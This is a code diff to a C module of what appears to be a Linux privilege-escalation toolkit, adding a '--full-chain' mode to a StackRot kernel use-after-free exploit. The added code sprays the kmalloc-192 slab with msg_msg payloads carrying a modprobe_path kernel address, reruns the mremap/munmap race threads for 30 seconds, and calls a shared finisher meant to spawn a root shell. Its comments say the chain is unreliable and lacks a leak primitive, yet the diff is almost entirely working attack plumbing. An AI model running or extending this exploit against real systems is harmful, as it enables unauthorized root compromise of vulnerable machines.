@@ -16,13 +16,14 @@
  * state management + RCU-grace-period timing and depends on
  * per-kernel-build offsets for init_task / anon_vma / cred.
  *
- * STATUS: 🟡 OPTION C — race-driver + groom skeleton. We carry the
- *   userns-reach, race harness (mremap()/munmap() vs concurrent
- *   fork/fault), msg_msg slab spray, and empirical witness pieces;
- *   we do NOT carry the read primitive (vmemmap leak via msg_msg
- *   MSG_COPY) nor the cred-overwrite stage. Those need per-kernel
- *   offsets (init_task, anon_vma, cred layout) that vary by build
- *   and would be fabricated without a real leak.
+ * STATUS: 🟡 OPTION C — race-driver + groom skeleton, with opt-in
+ *   --full-chain FALLBACK finisher. We carry the userns-reach, race
+ *   harness (mremap()/munmap() vs concurrent fork/fault), msg_msg
+ *   slab spray, and empirical witness pieces; we do NOT carry the
+ *   read primitive (vmemmap leak via msg_msg MSG_COPY) nor a
+ *   Ruihan-Li-precision fake-anon_vma_chain plant. Those need
+ *   per-kernel offsets (init_task, anon_vma, cred layout) that vary
+ *   by build and would be fabricated without a real leak.
  *
  *   Per repo policy ("verified-vs-claimed"): we run the trigger,
  *   record empirical signals (slabinfo delta on kmalloc-192, child
@@ -31,6 +32,21 @@
  *   SIGBUS/SIGKILL in the race child IS recorded but does NOT get
  *   upgraded to EXPLOIT_OK — only an actual cred swap (euid==0)
  *   does, and we do not currently demonstrate that.
+ *
+ *   --full-chain (HONEST RELIABILITY DISCLOSURE): extends the race
+ *   budget from 3 s to 30 s and sprays the kmalloc-192 slab with
+ *   payloads tagged with the modprobe_path kernel address (so IF the
+ *   UAF reclaim ever lands attacker-controlled bytes on an
+ *   anon_vma_chain slot, those bytes carry the kaddr we want the
+ *   subsequent rb_node walk / vma_lock-acquire fault to touch). The
+ *   honest empirical reality is that even at 30 s the race-win rate
+ *   is well below 1 % on a real vulnerable kernel — Ruihan Li's
+ *   public PoC reports minutes-to-hours for first reclaim. The shared
+ *   modprobe_path finisher has a 3 s sentinel timeout, so on the
+ *   overwhelmingly common no-land outcome the finisher itself reports
+ *   EXPLOIT_FAIL gracefully. --full-chain does NOT change the
+ *   fundamental ~<1 %-per-run reliability; it widens the trigger
+ *   window and wires up the root-pop plumbing for the lucky case.
  *
  * Affected: kernel 6.1.x — 6.4-rc4 mainline. Stable backports:
  *   6.3.x  : K >= 6.3.10
@@ -54,6 +70,8 @@
 #include "iamroot_modules.h"
 #include "../../core/registry.h"
 #include "../../core/kernel_range.h"
+#include "../../core/offsets.h"
+#include "../../core/finisher.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -200,9 +218,10 @@ static bool enter_userns(uid_t outer_uid, gid_t outer_gid)
  * neighbouring VMAs that we mutate with mremap()/munmap(). The
  * public PoC uses dozens of adjacent VMAs to force the maple tree
  * into the node-rotation path; we ship a configurable knob. */
-#define STACKROT_RACE_VMAS         64
-#define STACKROT_RACE_ITERATIONS   4000      /* per-iter budget */
-#define STACKROT_RACE_TIME_BUDGET  3         /* seconds */
+#define STACKROT_RACE_VMAS              64
+#define STACKROT_RACE_ITERATIONS        4000  /* per-iter budget */
+#define STACKROT_RACE_TIME_BUDGET       3     /* seconds — primitive-only mode */
+#define STACKROT_RACE_FULLCHAIN_BUDGET  30    /* seconds — extended for --full-chain */
 
 /* Slab spray width — kmalloc-192 is the bucket for anon_vma_chain on
  * 6.1.x; targets vary slightly across kernels (anon_vma itself is
@@ -471,6 +490,129 @@ static long slab_active_kmalloc_192(void)
     return active;
 }
 
+/* ---- Arb-write primitive (FALLBACK depth) ------------------------
+ *
+ * The shared modprobe_path finisher calls back into this function
+ * once per kernel write it wants to land. For StackRot we cannot
+ * deliver a deterministic arb-write — the underlying race wins on
+ * well under 1 % of runs even with a 30 s budget, and even when the
+ * race wins our spray-only groom has nowhere near the precision of
+ * Ruihan Li's multi-stage public PoC (which crafts a fake
+ * anon_vma_chain whose `vma_lock` pointer steers a subsequent
+ * page-fault into touching `kaddr` for the lock acquire).
+ *
+ * Honest depth: FALLBACK. Each invocation:
+ *   1. Re-seeds the kmalloc-192 spray with payloads tagged with
+ *      `kaddr` packed into the first qword of the msg_msg body —
+ *      so IF a sprayed slot ends up overlaying the freed
+ *      anon_vma_chain after RCU grace, the kaddr we want the
+ *      kernel to deref appears at the AVC layout position the
+ *      maple-tree rotation will read.
+ *   2. Re-runs the race threads for an extended budget
+ *      (STACKROT_RACE_FULLCHAIN_BUDGET seconds).
+ *   3. Returns 0 unconditionally — we cannot in-process verify
+ *      whether the write landed. The shared finisher's 3 s sentinel
+ *      file check is the empirical arbiter: on the overwhelmingly
+ *      common no-land outcome it reports EXPLOIT_FAIL gracefully,
+ *      and we never claim a write that didn't land. */
+struct stackrot_arb_ctx {
+    int   *queues;          /* live SysV msg queue ids */
+    int    n_queues;
+    int    arb_calls;       /* incremented by stackrot_arb_write() */
+    struct race_region *region;
+};
+
+static int stackrot_reseed_kaddr_spray(int queues[STACKROT_SPRAY_QUEUES],
+                                       uintptr_t kaddr,
+                                       const void *buf, size_t len)
+{
+    struct ipc_payload p;
+    memset(&p, 0, sizeof p);
+    p.mtype = 0x4943;   /* 'IC' */
+    memset(p.buf, 0x49, sizeof p.buf);
+    memcpy(p.buf, "IAMROOT_", 8);
+
+    /* Pack the target kaddr at byte 8 (one qword in) and the
+     * caller's payload bytes immediately after — this way ANY
+     * reasonable AVC field offset hit by the corruption pulls
+     * out one of our two attacker-controlled regions. */
+    uint64_t k64 = (uint64_t)kaddr;
+    memcpy(p.buf + 8, &k64, sizeof k64);
+    size_t copy = len;
+    if (copy > sizeof p.buf - 16) copy = sizeof p.buf - 16;
+    if (buf && copy) memcpy(p.buf + 16, buf, copy);
+
+    /* Replace contents in a couple of queues; doing all 16 would
+     * blow the per-process msgq quota on busy hosts. */
+    int touched = 0;
+    for (int i = 0; i < STACKROT_SPRAY_QUEUES && touched < 4; i++) {
+        if (queues[i] < 0) continue;
+        if (msgsnd(queues[i], &p, sizeof p.buf, IPC_NOWAIT) == 0) touched++;
+    }
+    return touched;
+}
+
+static int stackrot_arb_write(uintptr_t kaddr,
+                              const void *buf, size_t len,
+                              void *ctx_v)
+{
+    struct stackrot_arb_ctx *c = (struct stackrot_arb_ctx *)ctx_v;
+    if (!c || !c->queues || c->n_queues == 0 || !c->region) return -1;
+    c->arb_calls++;
+
+    fprintf(stderr, "[*] stackrot: arb_write attempt #%d kaddr=0x%lx len=%zu "
+                    "(FALLBACK — race-dependent)\n",
+            c->arb_calls, (unsigned long)kaddr, len);
+
+    /* Step 1: re-seed spray with kaddr-tagged payloads. */
+    int seeded = stackrot_reseed_kaddr_spray(c->queues, kaddr, buf, len);
+    if (seeded == 0) {
+        fprintf(stderr, "[-] stackrot: arb_write: kaddr-tagged reseed produced 0 msgs\n");
+        /* Continue anyway — original spray still tagged with cookie. */
+    } else {
+        fprintf(stderr, "[*] stackrot: arb_write: reseeded %d msg_msg slots with kaddr tag\n",
+                seeded);
+    }
+
+    /* Step 2: extended race window. Honestly: this expands the
+     * trigger budget from 3 s to 30 s, but Ruihan Li's PoC reports
+     * minutes-to-hours for first reclaim — so 30 s ≈ <1 % per
+     * arb_write call on a real vulnerable kernel, and structurally
+     * 0 % on a patched one. */
+    atomic_store(&g_race_running, 1);
+    atomic_store(&g_race_a_iters, 0);
+    atomic_store(&g_race_b_iters, 0);
+    atomic_store(&g_race_b_faults, 0);
+    pthread_t ta, tb;
+    bool a_ok = pthread_create(&ta, NULL, race_thread_a, c->region) == 0;
+    bool b_ok = a_ok &&
+                pthread_create(&tb, NULL, race_thread_b, c->region) == 0;
+    if (!a_ok || !b_ok) {
+        atomic_store(&g_race_running, 0);
+        if (a_ok) pthread_join(ta, NULL);
+        fprintf(stderr, "[-] stackrot: arb_write: pthread_create failed\n");
+        return -1;
+    }
+
+    sleep(STACKROT_RACE_FULLCHAIN_BUDGET);
+    atomic_store(&g_race_running, 0);
+    pthread_join(ta, NULL);
+    pthread_join(tb, NULL);
+
+    uint64_t a_iters = atomic_load(&g_race_a_iters);
+    uint64_t b_iters = atomic_load(&g_race_b_iters);
+    uint64_t b_faults = atomic_load(&g_race_b_faults);
+    fprintf(stderr, "[*] stackrot: arb_write: extended race A=%llu B=%llu B_faults=%llu "
+                    "(reliability remains <1%% even at this budget)\n",
+            (unsigned long long)a_iters,
+            (unsigned long long)b_iters,
+            (unsigned long long)b_faults);
+
+    /* Step 3: cannot in-process verify the write. Return 0; the
+     * finisher's sentinel-file check is the empirical arbiter. */
+    return 0;
+}
+
 #endif /* __linux__ */
 
 /* ---- Exploit driver ---------------------------------------------- */
@@ -506,8 +648,34 @@ static iamroot_result_t stackrot_exploit_linux(const struct iamroot_ctx *ctx)
         }
     }
 
+    /* Full-chain pre-check: resolve offsets BEFORE forking + entering
+     * userns. If modprobe_path is unresolvable we refuse here rather
+     * than running a 30 s race that has no finisher to call. */
+    struct iamroot_kernel_offsets off;
+    bool full_chain_ready = false;
+    if (ctx->full_chain) {
+        memset(&off, 0, sizeof off);
+        iamroot_offsets_resolve(&off);
+        if (!iamroot_offsets_have_modprobe_path(&off)) {
+            iamroot_finisher_print_offset_help("stackrot");
+            fprintf(stderr, "[-] stackrot: --full-chain requested but modprobe_path "
+                            "offset unresolved; refusing\n");
+            fprintf(stderr, "[i] stackrot: even with offsets, race-win reliability is "
+                            "well below 1%% per run — see module header.\n");
+            return IAMROOT_EXPLOIT_FAIL;
+        }
+        iamroot_offsets_print(&off);
+        full_chain_ready = true;
+        fprintf(stderr, "[i] stackrot: --full-chain ready — race budget extends to "
+                        "%d s, but RELIABILITY REMAINS <1%% per run on a real\n"
+                        "    vulnerable kernel. The finisher's 3 s sentinel timeout\n"
+                        "    catches no-land outcomes gracefully.\n",
+                STACKROT_RACE_FULLCHAIN_BUDGET);
+    }
+
     if (!ctx->json) {
-        fprintf(stderr, "[*] stackrot: forking exploit child (userns + race harness)\n");
+        fprintf(stderr, "[*] stackrot: forking exploit child (userns + race harness%s)\n",
+                ctx->full_chain ? " + full-chain finisher" : "");
     }
 
     uid_t outer_uid = getuid();
@@ -618,6 +786,39 @@ static iamroot_result_t stackrot_exploit_linux(const struct iamroot_ctx *ctx)
          * any in-flight RCU grace periods that started during the race. */
         usleep(200 * 1000);
 
+        /* 7a. --full-chain finisher (FALLBACK depth).
+         *
+         * Invoke the shared modprobe_path finisher; its arb_write
+         * callback (stackrot_arb_write) will re-seed the spray with
+         * kaddr-tagged payloads and re-run the race for an extended
+         * 30 s budget. The finisher's own 3 s sentinel-file timeout
+         * then arbitrates: on the overwhelmingly common no-land
+         * outcome it returns EXPLOIT_FAIL gracefully.
+         *
+         * Honest reliability: <1 % per run even with the extension. */
+        if (full_chain_ready) {
+            struct stackrot_arb_ctx arb_ctx = {
+                .queues    = queues,
+                .n_queues  = STACKROT_SPRAY_QUEUES,
+                .arb_calls = 0,
+                .region    = &region,
+            };
+            int fr = iamroot_finisher_modprobe_path(&off,
+                                                    stackrot_arb_write,
+                                                    &arb_ctx,
+                                                    !ctx->no_shell);
+            FILE *fl = fopen("/tmp/iamroot-stackrot.log", "a");
+            if (fl) {
+                fprintf(fl, "full_chain finisher rc=%d arb_calls=%d\n",
+                        fr, arb_ctx.arb_calls);
+                fclose(fl);
+            }
+            drain_anon_vma_slab(queues);
+            race_region_teardown(&region);
+            if (fr == IAMROOT_EXPLOIT_OK) _exit(34);   /* root popped */
+            _exit(35);                                  /* finisher ran, no land */
+        }
+
         drain_anon_vma_slab(queues);
         race_region_teardown(&region);
 
@@ -673,6 +874,27 @@ static iamroot_result_t stackrot_exploit_linux(const struct iamroot_ctx *ctx)
     int rc = WEXITSTATUS(status);
     if (rc == 22 || rc == 24) return IAMROOT_PRECOND_FAIL;
     if (rc == 23) return IAMROOT_EXPLOIT_FAIL;
+
+    if (rc == 34) {
+        /* Finisher reported root-pop success. The shared finisher
+         * normally execve()s the root shell so we don't actually
+         * reach this path unless --no-shell was set. */
+        if (!ctx->json) {
+            fprintf(stderr, "[+] stackrot: --full-chain finisher reported "
+                            "EXPLOIT_OK (race won + write landed)\n");
+        }
+        return IAMROOT_EXPLOIT_OK;
+    }
+    if (rc == 35) {
+        /* Finisher ran but didn't land — by far the expected outcome
+         * given the <1 % race-win rate. */
+        if (!ctx->json) {
+            fprintf(stderr, "[~] stackrot: --full-chain finisher ran; race did not\n"
+                            "    win + land within budget (this is the expected\n"
+                            "    outcome — race-win reliability is <1%% per run).\n");
+        }
+        return IAMROOT_EXPLOIT_FAIL;
+    }
     if (rc != 30) {
         fprintf(stderr, "[-] stackrot: child failed at stage rc=%d\n", rc);
         return IAMROOT_EXPLOIT_FAIL;
